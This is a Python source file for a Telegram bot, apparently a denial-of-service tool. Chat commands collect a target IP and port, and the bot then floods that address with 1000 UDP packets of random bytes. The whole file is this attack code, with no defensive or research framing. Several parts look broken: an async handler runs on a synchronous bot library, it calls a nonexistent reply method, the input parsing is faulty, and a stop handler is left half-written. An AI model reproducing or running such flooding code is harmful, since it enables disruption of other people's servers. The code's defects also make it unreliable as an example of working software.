#!/usr/bin/env python3
"""
Copyright 2023 host1let

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
"""

from colorama import Fore as f
import telebot
import socket
import random
import asyncio
import time
import uuid

def randomBytes():
    return random._urandom(1490)

def uid():
    return uuid.uuid4().hex

def infoBox(msg):
    return "{}[{}{}{}] [{}{}{}] {}".format(f.RESET, f.GREEN, "Info", f.RESET, f.YELLOW, time.strftime("%H:%M:%S"), f.RESET, msg)

def errorBox(msg):
    return "{}[{}{}{}] [{}{}{}] {}".format(f.RESET, f.RED, "ERROR", f.RESET, f.YELLOW, time.strftime("%H:%%M:%S"), f.RESET, msg)

def start(ip, port, for_):
    num = 0
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#        num += 1

        for i in range(for_):
            sock.sendto(randomBytes(), (ip, port))
            num += 1
    except Exception as e:
        return e
        pass

    finally:
        return num


app = telebot.TeleBot(str("Enter Token > "))

data : dict = {}

@app.message_handler(content_types=["text"], chat_types=["private"])


async def main(msg):

    text = str(msg.text)

    if text.startswith("/set_ip"):
        ip = text.replace("/set_ip ", "")
        ip_code = uid()
        data["ip{}".format(ip_code)] = ip

        await app.reply(msg, f"ip code : {ip_code}")

    if text.startswith("/set_port"):
        port = int(text.replace("/set_port ", ""))
        port_code = uid()
        data["port{}".format(port_code)] = port

        await app.reply(msg, f"port code: {port_code}")

    if text.startswith("start"):
        await app.reply(msg, "get data ...")
        more = text.replace("start ", "")

        ipportCode = [str(z) for z in more.split(":")]

        ipcode = ipportCode[1]
        portcode = ipportCode[3]

        for i, p in data.items():

            if i.startswith("ip"):
                code = i.replace("ip", "")
                
                if code == ipcode:
                    global ipMain
                    ipMain = p

                else:
                    pass 
            if i.startswith("port"):
                codeport = i.replace("port", "")

                if codeport == portcode:
                    global portMain
                    portMain = p

        await  app.reply(msg, "process ...")
        res = start(ipMain, portMain, 1000)
        await app.reply(msg, "sended => {}".format(res))

  #  if text.startswith("/stop"):
 #       codeToStop = text.replace("/stop ", "")
#
 #       for k in data.keys():
#
  #          if k.startswith("ip"):
 #               code = k.replace("ip", "")
#
#                if code == codeT



    
asyncio.run(app.infinity_polling())

